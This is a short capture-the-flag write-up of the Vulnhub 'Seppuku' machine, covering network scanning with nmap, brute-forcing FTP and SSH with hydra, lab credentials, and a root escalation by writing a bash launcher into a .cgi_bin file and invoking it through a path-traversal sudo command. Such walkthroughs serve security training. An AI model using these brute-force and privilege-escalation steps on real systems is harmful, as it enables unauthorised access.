---
title: WRITE-UP Seppuku
date: 2024-08-02 00:00:01 +0700
categories: [write up, vulnhub, red team, oscp]
tags: [vulnhub]     # TAG names should always be lowercase
---

# Write-up seppuku

## 1. Enumeration

i used ```netdiscover```  to see real IP mylab

``` terminal
netdiscover
```
![alt text](/assets/img/seppuku/sep_netdiscover.png)
IP: ```192.168.100.17 ```

i used nmap to see port open 

```terminal
sudo nmap -sC -sV -vvv -p- --min-rate=1000 192.168.100.17
```

*   sC : Enable default script to quick and safe
*   sV : Detect service
*   vvv : increase verbosity
*   p : port to scan "-p-" is all port 1-65535
*   min-rate=1000 : packets are sent < 1000s

![alt text](/assets/img/seppuku/sep_nmap1.png)
![alt text](/assets/img/seppuku/sep_nmap2.png)

*   21 ```ftp``` 
*   22 ```ssh```
*   139-145 ```smb```
*   80-7601-7080-8088 ```http```

![alt text](/assets/img/seppuku/sep_7601_secret.png)
![alt text](/assets/img/seppuku/sep_rsakey.png)

## 2. Post Exploitation
crack ```ftp``` and ```ssh``` password with this credentials using ```hydra```

![alt text](/assets/img/seppuku/sep_ftp.png)

![alt text](/assets/img/seppuku/sep_ssh.png)

user ``` seppuku``` pass ```eeyoree```

## 3. Privilage Escalation

insite we find password of samurai is
```12345685213456!@!@A``` and i use ```sudo -l ``` to get ```root```

![alt text](/assets/img/seppuku/sep_ssh_all.png)

but in ```tanto``` don't have file but he use private key to go ```ssh``` and after recon we have it . 
```
ssh -i private.bak tanto@192.168.100.7 
touch .cgi_bin/bin
echo "/bin/bash" >> .cgi_bin/bin 
chmod 777 .cgi_bin/bin
```
after that i run ```sudo ``` with commnad can run with ```root```

```
sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/
```

![alt text](/assets/img/seppuku/sep_root.png)

